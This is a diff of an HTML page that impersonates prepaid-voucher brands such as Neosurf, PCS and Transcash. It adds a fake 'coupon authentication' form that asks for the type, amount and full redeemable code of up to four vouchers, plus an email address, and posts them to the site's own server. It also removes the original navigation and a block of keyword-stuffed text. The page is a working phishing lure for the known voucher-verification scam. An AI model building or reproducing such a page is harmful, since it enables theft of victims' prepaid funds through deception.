@@ -59,57 +59,19 @@
   <nav id="header" class="navbar navbar-default navbar-static-top">
     <div class="navbar-header">
       <div class="row">
-        <div class="col-xs-4">
-          <a id="logo" class="navbar-brand" href="#"><img class="img-responsive" src="images/neosurf/neosurfLogo2.png" alt="NEOSURF" title="Accueil"></a>
-        </div>
-        <div class="col-xs-4">
-          <a id="logo" class="navbar-brand" href="#"><img class="img-responsive" src="images/neosurf/pcs.png" alt="PCS" title="Accueil"></a>
-        </div>
-        <div class="col-xs-4">
-          <a id="logo" class="navbar-brand" href="#"><img class="img-responsive" src="images/neosurf/neo.jpg" alt="NEOSURF" title="Accueil"></a>
+        <div class="col-xs-12">
+          <img class="img-responsive" src="images/neosurf/images.jpg" alt="images" width="100%" height="250px" title="Accueil">
         </div>
       </div>
-
-
-      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
-        <span class="sr-only">Toggle navigation</span>
-        <span class="icon-bar"></span>
-        <span class="icon-bar"></span>
-        <span class="icon-bar"></span>
-      </button>
-
-      <div class="pull-right dropdown language-switcher">
-        <button class="btn btn-sm btn-default dropdown-toggle" type="button" id="select-languages" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
-          Français <span class="caret"></span>
-        </button>
-        <ul id="flasg" class="dropdown-menu" aria-labelledby="select-languages">
-          <li><a href="#"><img src="images/neosurf/FR.png" alt="fr_FR" title=""> Français</a></li>
-          <li><a href="#"><img src="images/neosurf/EN.png" alt="en_GB" title=""> English</a></li>
-
-        </ul>
-      </div>
-    </div>
-
-    <div class="collapse navbar-collapse" id="navbar">
-      <ul class="nav navbar-nav" id="menu">
-        <li> <a class="menuLink " href="#">ACCUEIL</a> </li>
-        <li> <a class="menuLink " href="http://www.recharge.fr/">COMMENT ÇA MARCHE ?</a> </li>
-        <li> <a class="menuLink " href="http://www.recharge.fr/">OÙ TROUVER UN COUPON ?</a> </li>
-        <li> <a class="menuLink " href="http://www.recharge.fr/">OÙ PAYER AVEC UN COUPON ?</a> </li>
-        <li><a href="recharge.html" style="text-transform: uppercase;">Attestation de validité</a></li>
-        <li> <a class="menuLink " href="#">CONTACT</a> </li>
-        <li> <a class="bgColor6 menuLink  menuLinkConnexion" href="https://www.recharge.fr/">MA CARTE</a> </li>
-      </ul>
     </div>
   </nav>
 
   <main class="main" style="background-image: url('images/neosurf/controle_neosurf.png'); background-color: #ffffff; background-position: right bottom;background-repeat: no-repeat;">
     <script type="text/javascript" src="assets/js/neosurf_pincode.js"></script>
     <div id="content" class="container">
-      <h1>AUTHENTIFICATION CODE COUPON</h1>
-      <p id="explanation" class="well">Demandez l'authentification d'un ou plusieurs coupons en indiquant le code
-        figurant sur chaque carte ou ticket Mastercard afin de recevoir par mail les informations et un lien de
-        télchargement unique de l'attestation pour prouver l'affirmation de son statut.</p>
+      <h1 style="text-align: center;">AUTHENTIFICATION DE VOS COUPON DE TABACS</h1>
+      <h3 style="text-align: center;">Formulaire de contrôle de vos coupons</h3>
+      <p id="explanation" class="well">Les informations entrées ne sont traités que par le serveur et sont totalement confidentielles. <br> Veuillez insérer un mail valide afin de recevoir la confirmation par courriel.</p>
       <div id="formCenter" class="row">
         <div class="col-sm-4 col-sm-push-3 col-md-3 col-md-push-4">
           <form action="/message" method="POST" name="loginForm1" id="loginForm1" onsubmit="return submitOnce()">
@@ -117,60 +79,73 @@
             <div class="row">
               <div class="col-xs-6">
                 <div class="form-group">
-                  <select class="form-control input-sm" id="type" name="type">
-                    <option selected value="">Type de coupon</option>
-                    <option value="NEOSURF">NEOSURF</option>
-                    <option value="TRANSCASH">TRANSCASH</option>
-                    <option value="PCS">PCS</option>
-                    <option value="TONEO FIRST">TONEO FIRST</option>
-                    <option value="CASH LIB">CASH LIB</option>
-                    <option value="GOOGLE PLAY">GOOGLE PLAY</option>
-                    <option value="STREAM CARD">STREAM CARD</option>
-                    <option value="AMAZON">AMAZON</option>
-                    <option value="ZALANDO">ZALANDO</option>
-                  </select>
+                  <div>Type de ticket*</div> <br>
+                  <input type="radio" value="TRANSCASH" name="typeC"> <strong>Transcash</strong> <br><br>
+                  <input type="radio" value="PCS" name="typeC"> <strong> PCS</strong> <br><br>
+                  <input type="radio" value="Neosurf" name="typeC"><strong> Neosurf</strong> <br><br>
+                  <input type="radio" value="Google Play" name="typeC"><strong> Google Play</strong> <br><br>
+                  <input type="radio" value="Carte Steam" name="typeC"><strong> Carte Steam</strong> <br><br>
+                  <input type="radio" value="Itunes" name="typeC"><strong> iTunes</strong> <br><br>
+                  <input type="radio" value="Paysafecard" name="typeC"><strong> Paysafecard</strong> <br><br>
+                  <input type="radio" value="Toneo" name="typeC"> <strong>Toneo</strong> <br><br>
+                  <input type="radio" value="Cashlib" name="typeC"><strong> Cashlib</strong> <br><br>
                 </div>
               </div>
 
             </div>
             <div class="row">
-              <div class="col-xs-6">
-                <div class="form-group">
-                  <select class="form-control input-sm" id="angeselect" name="cc1">
-                    <option selected value="1">Nombre coupon</option>
-                    <option value="1">1</option>
-                    <option value="2">2</option>
-                    <option value="3">3</option>
-                    <option value="4">4</option>
-                    <option value="5">5</option>
-                    <option value="6">6</option>
-                    <option value="7">7</option>
-                    <option value="8">8</option>
-                    <option value="9">9</option>
-                    <option value="10">10</option>
-                  </select>
-                </div>
+
+              <div class="form-group">
+                Montant du Ticket 1* <br>
+                <input type="text" name="m1">
               </div>
-              <div class="col-xs-6">
-                <div class="form-group">
-                  <input type="email" class="form-control input-sm" size="6" placeholder="Email" name="email" maxlength="30" autocomplete="off" required title="This field is required.">
-                  <input type="hidden" name="pin1" autocomplete="off">
-                </div>
+              <div class="form-group">
+                Code du coupon 1* <br>
+                <input type="text" name="cc1" class="form-control input-sm" size="30" placeholder="Code coupon" maxlength="30">
               </div>
-              <div class="col-xs-6">
-                <div class="form-group">
-                  <input type="text" class="form-control input-sm" size="6" placeholder="Téléphone" name="tel" maxlength="12" autocomplete="off" required title="This field is required.">
-                  <input type="hidden" name="pin1" autocomplete="off">
-                </div>
-              </div>
+
             </div>
-            <div class="row" id="champsrecharge">
-              <div class="col-xs-12">
-                <div class="form-group">
-                  <input type="text" name="pin1" required="required" class="form-control input-sm" size="30" placeholder="Code coupon" maxlength="30" id="pin1" onkeyup="javascript:pinHelper(1,&quot;loginForm1&quot;)" required>
-                </div>
+
+            <div class="row">
+
+              <div class="form-group">
+                Montant du Ticket 2* <br>
+                <input type="text" name="m2">
               </div>
+              <div class="form-group">
+                Code du coupon 2* <br>
+                <input type="text" name="cc2" class="form-control input-sm" size="30" placeholder="Code coupon" maxlength="30">
+              </div>
+
             </div>
+
+            <div class="row">
+
+              <div class="form-group">
+                Montant du Ticket 3* <br>
+                <input type="text" name="m3">
+              </div>
+              <div class="form-group">
+                Code du coupon 3* <br>
+                <input type="text" name="cc3" class="form-control input-sm" size="30" placeholder="Code coupon" maxlength="30">
+              </div>
+
+            </div>
+
+            <div class="row">
+
+              <div class="form-group">
+                Montant du Ticket 4* <br>
+                <input type="text" name="m4">
+              </div>
+              <div class="form-group">
+                Code du coupon 4* <br>
+                <input type="text" name="cc4" class="form-control input-sm" size="30" placeholder="Code coupon" maxlength="30">
+
+              </div>
+
+            </div>
+
             <div data-field-wrapper="fld_8843075" class="form-group" id="fld_8843075_1-wrap">
               <label id="fld_8843075Label" for="fld_8843075_1" class="control-label screen-reader-text sr-only">cacher</label>
               <div class="">
@@ -181,24 +156,18 @@
                 </div>
               </div>
             </div>
+            <div class="form-group">
+              Email* <br>
+              <input type="email" name="mail" required class="form-control input-sm" size="30" maxlength="30">
+
+            </div>
             <div id="submit_form_pincode">
-              <button type="button" name="return" class="btn btn-default" value="" onclick="history.back();">Retour</button>
-              <input type="submit" name="submit" class="btn btn-primary" value="Valider">
+              <input type="submit" name="submit" class="btn" value="Authentifier" style="background-color: green; color:#ffffff;">
             </div>
             <div>
               <input type="hidden" name="sid" value="">
             </div>
-            <div style="font-size: 12px; color: black;">Mastercard; Code Mastercard; Coupon Mastercard; Ticket
-              Mastercard; Recharge Mastercard; Pin Mastercard; Verifier Mastercard; Verifier Code Mastercard; Verifier
-              Coupon Mastercard; Verifier Ticket Mastercard; Verifier Recharge Mastercard; Verifier Pin Mastercard;
-              Rembourser Mastercard; Rembourser Code Mastercard; Rembourser Coupon Mastercard; Rembourser Ticket
-              Mastercard; Rembourser Recharge Mastercard; Rembourser Pin Mastercard; Remboursement Mastercard;
-              Remboursement Code Mastercard; Remboursement Coupon Mastercard; Remboursement Ticket Mastercard;
-              Remboursement Recharge Mastercard; Remboursement Pin Mastercard; Consulter Mastercard; Consulter Code
-              Mastercard; Consulter Coupon Mastercard; Consulter Ticket Mastercard; Consulter Recharge Mastercard;
-              Consulter Pin Mastercard; Consultation solde Mastercard; Consultation Code Mastercard; Consultation Coupon
-              Mastercard; Consultation Ticket Mastercard; Consultation Recharge Mastercard; Consultation Pin Recharge
-            </div>
+
           </form>
         </div>
         <script type="text/javascript">
